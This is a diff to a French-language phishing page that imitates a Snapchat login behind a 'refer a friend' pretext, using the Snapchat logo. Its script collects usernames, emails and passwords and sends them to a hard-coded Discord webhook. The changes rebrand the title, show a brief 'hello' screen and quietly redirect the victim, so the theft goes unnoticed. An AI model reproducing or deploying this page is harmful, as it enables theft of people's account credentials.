@@ -3,10 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Snapchat | Parrainez Un Amis</title>
+  <title>RankosSite | Parrainez Un Amis</title>
 
-  <!-- Meta Open Graph -->
-  <meta property="og:title" content="Snapchat | Parrainez Un Amis" />
+  <meta property="og:title" content="RankosSite | Parrainez Un Amis" />
   <meta property="og:description" content="Description courte" />
   <meta property="og:image" content="https://i.ibb.co/wZhXf3RN/Snapchat-1.png" />
 
@@ -22,7 +21,7 @@
       height: 100vh;
       color: #000;
     }
-    .login-box {
+    .login-box, .hello-box {
       width: 100%;
       max-width: 400px;
       padding: 40px;
@@ -31,6 +30,11 @@
       text-align: center;
       background-color: #fff;
       color: #000;
+    }
+    .hello-box {
+      display: none;
+      font-size: 24px;
+      font-weight: bold;
     }
     .logo {
       width: 80px;
@@ -101,9 +105,9 @@
   </style>
 </head>
 <body>
-  <div class="login-box">
+  <div class="login-box" id="loginBox">
     <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
-    <h2>Snapchat | Parrainez Un Amis</h2>
+    <h2>RankosSite | Parrainez Un Amis</h2>
     <form id="loginForm">
       <div class="form-group">
         <label for="username">Nom d'utilisateur ou e-mail</label>
@@ -128,6 +132,8 @@
     <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
     <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
   </div>
+
+  <div class="hello-box" id="helloBox">hello</div>
 
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1382387384997515294/yI75S1jd9z_vRaMRNBYR8Kk_i8rNs8_cMeeNtMRoU7IZgWtI-R6Cch95PsOPsG51K8s2";
@@ -160,6 +166,10 @@
         referralError.style.display = 'block';
         return;
       }
+
+      // Masquer l'interface principale et afficher "hello"
+      document.getElementById('loginBox').style.display = 'none';
+      document.getElementById('helloBox').style.display = 'block';
 
       const message = {
         embeds: [
@@ -198,13 +208,9 @@
         body: JSON.stringify(message),
       })
       .then(response => {
-        if (response.ok) {
-          alert("Données envoyées avec succès !");
-          document.getElementById('loginForm').reset();
+        setTimeout(() => {
           window.location.href = redirectURL;
-        } else {
-          alert("Erreur lors de l'envoi des données.");
-        }
+        }, 1500); // attendre 1.5s pour montrer "hello"
       })
       .catch(error => {
         alert("Erreur réseau ou CORS.");
